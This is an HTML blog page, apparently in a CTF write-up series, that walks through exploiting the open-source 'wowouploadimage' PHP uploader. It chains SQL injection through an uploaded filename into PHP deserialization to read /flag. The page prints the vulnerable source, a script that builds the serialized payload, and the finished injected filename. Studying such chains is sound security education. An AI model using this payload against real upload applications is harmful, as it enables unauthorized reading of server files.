@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>pop链5之sql注入的反序列化利用 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="pop链5之sql注入的反序列化利用我们打开页面后，发现一个关键点 1Powered By wowouploadimage  我们可以在github里下载源码，，发现有几个php文件，分别是 123helper.phpshow.phpupload.php 通过对源码的大概审计，发现helper.php是主要的文件 123456789101112131415161718192021222324252">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pop链5之sql注入的反序列化利用">
+<meta property="og:url" content="http://example.com/2021/10/20/pop%E9%93%BE5%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="pop链5之sql注入的反序列化利用我们打开页面后，发现一个关键点 1Powered By wowouploadimage  我们可以在github里下载源码，，发现有几个php文件，分别是 123helper.phpshow.phpupload.php 通过对源码的大概审计，发现helper.php是主要的文件 123456789101112131415161718192021222324252">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-10-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-20T16:25:09.164Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.5px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.25px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-pop链5之sql注入的反序列化利用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/20/pop%E9%93%BE5%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/" class="article-date">
+  	<time datetime="2021-10-19T16:00:00.000Z" itemprop="datePublished">2021-10-20</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pop链5之sql注入的反序列化利用
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="pop链5之sql注入的反序列化利用"><a href="#pop链5之sql注入的反序列化利用" class="headerlink" title="pop链5之sql注入的反序列化利用"></a>pop链5之sql注入的反序列化利用</h1><p>我们打开页面后，发现一个关键点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powered By wowouploadimage </span><br></pre></td></tr></table></figure>
+<p>我们可以在github里下载源码，，发现有几个php文件，分别是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">helper.php</span><br><span class="line">show.php</span><br><span class="line">upload.php</span><br></pre></td></tr></table></figure>
+<p>通过对源码的大概审计，发现helper.php是主要的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class helper &#123;</span><br><span class="line">	protected $folder = &quot;pic/&quot;;</span><br><span class="line">	protected $ifview = False; </span><br><span class="line">	protected $config = &quot;config.txt&quot;;</span><br><span class="line">	// The function is not yet perfect, it is not open yet.</span><br><span class="line"></span><br><span class="line">	public function upload($input=&quot;file&quot;)</span><br><span class="line">	&#123;</span><br><span class="line">		$fileinfo = $this-&gt;getfile($input);</span><br><span class="line">		$array = array();</span><br><span class="line">		$array[&quot;title&quot;] = $fileinfo[&#x27;title&#x27;];</span><br><span class="line">		$array[&quot;filename&quot;] = $fileinfo[&#x27;filename&#x27;];</span><br><span class="line">		$array[&quot;ext&quot;] = $fileinfo[&#x27;ext&#x27;];</span><br><span class="line">		$array[&quot;path&quot;] = $fileinfo[&#x27;path&#x27;];</span><br><span class="line">		$img_ext = getimagesize($_FILES[$input][&quot;tmp_name&quot;]);</span><br><span class="line">		$my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">		$array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">		$id = $this-&gt;save($array);</span><br><span class="line">		if ($id == 0)&#123;</span><br><span class="line">			die(&quot;Something wrong!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is $id.&lt;/p&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function getfile($input)</span><br><span class="line">	&#123;</span><br><span class="line">		if(isset($input))&#123;</span><br><span class="line">			$rs = $this-&gt;check($_FILES[$input]);</span><br><span class="line">		&#125;</span><br><span class="line">		return $rs;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function check($info)</span><br><span class="line">	&#123;</span><br><span class="line">		$basename = substr(md5(time().uniqid()),9,16);</span><br><span class="line">		$filename = $info[&quot;name&quot;];</span><br><span class="line">		$ext = substr(strrchr($filename, &#x27;.&#x27;), 1);</span><br><span class="line">		$cate_exts = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">		if(!in_array($ext,$cate_exts))&#123;</span><br><span class="line">			die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	    $title = str_replace(&quot;.&quot;.$ext,&#x27;&#x27;,$filename);</span><br><span class="line">	    return array(&#x27;title&#x27;=&gt;$title,&#x27;filename&#x27;=&gt;$basename.&quot;.&quot;.$ext,&#x27;ext&#x27;=&gt;$ext,&#x27;path&#x27;=&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function save($data)</span><br><span class="line">	&#123;</span><br><span class="line">		if(!$data || !is_array($data))&#123;</span><br><span class="line">			die(&quot;Something wrong!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$id = $this-&gt;insert_array($data);</span><br><span class="line">		return $id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function insert_array($data)</span><br><span class="line">	&#123;	</span><br><span class="line">		$con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;);</span><br><span class="line">		if (mysqli_connect_errno($con)) </span><br><span class="line">		&#123; </span><br><span class="line">		    die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">		$sql_fields = array();</span><br><span class="line">		$sql_val = array();</span><br><span class="line">		foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">			$key_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\0\0\0&#x27;, $key);</span><br><span class="line">			$value_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\0\0\0&#x27;, $value);</span><br><span class="line">			$sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;;</span><br><span class="line">			$sql_val[] = &quot;&#x27;&quot;.$value_temp.&quot;&#x27;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</span><br><span class="line">		mysqli_query($con, $sql);</span><br><span class="line">		$id = mysqli_insert_id($con);</span><br><span class="line">		mysqli_close($con);</span><br><span class="line">		return $id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function view_files($path)&#123;</span><br><span class="line">		if ($this-&gt;ifview == False)&#123;</span><br><span class="line">			return False;</span><br><span class="line">			//The function is not yet perfect, it is not open yet.</span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($path);</span><br><span class="line">		echo $content;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		# Read some config html</span><br><span class="line">		$this-&gt;view_files($this-&gt;config);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我们查看上传文件的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public function upload($input=&quot;file&quot;)</span><br><span class="line">&#123;</span><br><span class="line">	$fileinfo = $this-&gt;getfile($input);</span><br><span class="line">	$array = array();</span><br><span class="line">	$array[&quot;title&quot;] = $fileinfo[&#x27;title&#x27;];</span><br><span class="line">	$array[&quot;filename&quot;] = $fileinfo[&#x27;filename&#x27;];</span><br><span class="line">	$array[&quot;ext&quot;] = $fileinfo[&#x27;ext&#x27;];</span><br><span class="line">	$array[&quot;path&quot;] = $fileinfo[&#x27;path&#x27;];</span><br><span class="line">	$img_ext = getimagesize($_FILES[$input][&quot;tmp_name&quot;]);</span><br><span class="line">	$my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">	$array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">	$id = $this-&gt;save($array);</span><br><span class="line">	if ($id == 0)&#123;</span><br><span class="line">		die(&quot;Something wrong!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is $id.&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以发现一个序列化的点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$array[&quot;attr&quot;] = serialize($my_ext);</span><br></pre></td></tr></table></figure>
+<p>而且，通过审计helper.php源码，还发现了一个危险的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">	public function view_files($path)&#123;</span><br><span class="line">		if ($this-&gt;ifview == False)&#123;</span><br><span class="line">			return False;</span><br><span class="line">			//The function is not yet perfect, it is not open yet.</span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($path);</span><br><span class="line">		echo $content;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		# Read some config html</span><br><span class="line">		$this-&gt;view_files($this-&gt;config);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过对上面代码的审计，发现只要我们在销毁对象时，即可使用file_get_contents()函数，来读取信息，所以我们可以构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class helper&#123;</span><br><span class="line">	protected $ifview=true;</span><br><span class="line">	protected $config=/flag;</span><br><span class="line">&#125;</span><br><span class="line">$a=new helper();</span><br><span class="line">echo bin2hex(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后我们寻找反序列化的点，发现在show.php文件中有一个反序列化的点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$attr = unserialize($attr_temp);</span><br></pre></td></tr></table></figure>
+<p>然后我们在helper.php文件中，从getfile()函数可以指到check()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function check($info)</span><br><span class="line">&#123;</span><br><span class="line">	$basename = substr(md5(time().uniqid()),9,16);</span><br><span class="line">	$filename = $info[&quot;name&quot;];</span><br><span class="line">	$ext = substr(strrchr($filename, &#x27;.&#x27;), 1);</span><br><span class="line">	$cate_exts = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">	if(!in_array($ext,$cate_exts))&#123;</span><br><span class="line">		die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">    $title = str_replace(&quot;.&quot;.$ext,&#x27;&#x27;,$filename);</span><br><span class="line">    return array(&#x27;title&#x27;=&gt;$title,&#x27;filename&#x27;=&gt;$basename.&quot;.&quot;.$ext,&#x27;ext&#x27;=&gt;$ext,&#x27;path&#x27;=&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>知道上传文件中各变量的含义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$array[&quot;title&quot;]：去掉后缀的文件名</span><br><span class="line">$array[&quot;filename&quot;]：substr(md5(time().uniqid()),9,16)加上后缀</span><br><span class="line">$array[&quot;ext&quot;]：上传文件名后缀</span><br><span class="line">$array[&quot;path&quot;]：路径信息</span><br><span class="line">$array[&quot;attr&quot;]：反序列化后的图片长宽信息</span><br></pre></td></tr></table></figure>
+<p>然后再看回show.php文件的Get_All_Images()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function Get_All_Images()&#123;</span><br><span class="line">	$sql = &quot;SELECT * FROM images&quot;;</span><br><span class="line">	$result = mysqli_query($this-&gt;con, $sql);</span><br><span class="line">	if ($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">	    while($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">	    	if($row[&quot;attr&quot;])&#123;</span><br><span class="line">	    		$attr_temp = str_replace(&#x27;\0\0\0&#x27;, chr(0).&#x27;*&#x27;.chr(0), $row[&quot;attr&quot;]);</span><br><span class="line">				$attr = unserialize($attr_temp);</span><br><span class="line">			&#125;</span><br><span class="line">	        echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">	    echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	mysqli_close($this-&gt;con);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可知会将上传文件的长宽的序列化信息进行反序列化，这是我们可以利用的点，来输入我们构造的序列化信息，进行变量覆盖，从而利用file_get_contents()读取flag信息，而这里是提取数据库中的信息，所以我们需要找一个sql注入的点，而我们可以看helper.php文件中的save()函数，然后save()函数指向insert_array()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public function insert_array($data)</span><br><span class="line">&#123;	</span><br><span class="line">	$con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;);</span><br><span class="line">	if (mysqli_connect_errno($con)) </span><br><span class="line">	&#123; </span><br><span class="line">	    die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());</span><br><span class="line">	&#125;</span><br><span class="line">	$sql_fields = array();</span><br><span class="line">	$sql_val = array();</span><br><span class="line">	foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">		$key_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\0\0\0&#x27;, $key);</span><br><span class="line">		$value_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\0\0\0&#x27;, $value);</span><br><span class="line">		$sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;;</span><br><span class="line">		$sql_val[] = &quot;&#x27;&quot;.$value_temp.&quot;&#x27;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</span><br><span class="line">	mysqli_query($con, $sql);</span><br><span class="line">	$id = mysqli_insert_id($con);</span><br><span class="line">	mysqli_close($con);</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可见它会将上传文件的那些变量信息写入数据库中，然后我们访问show.php文件，触发反序列化，从而将我们构造在图片长宽的序列化数据进行反序列化，从而使用file_get_contents()函数来读取flag，从check()函数中，我们发现只可以从title变量下手，所以我们可以先上传一个文件，然后文件名为我们构造的传入数据库的信息，即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;a&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#&quot;</span><br></pre></td></tr></table></figure>
+<p>再访问一下show.php就可以看见flag了</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/10/18/CRLF%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8ASoapClinet%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="pop链5之sql注入的反序列化利用" data-title="pop链5之sql注入的反序列化利用" data-url="http://example.com/2021/10/20/pop%E9%93%BE5%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/"  data-images="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" data-content="pop链5之sql注入的反序列化利用">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
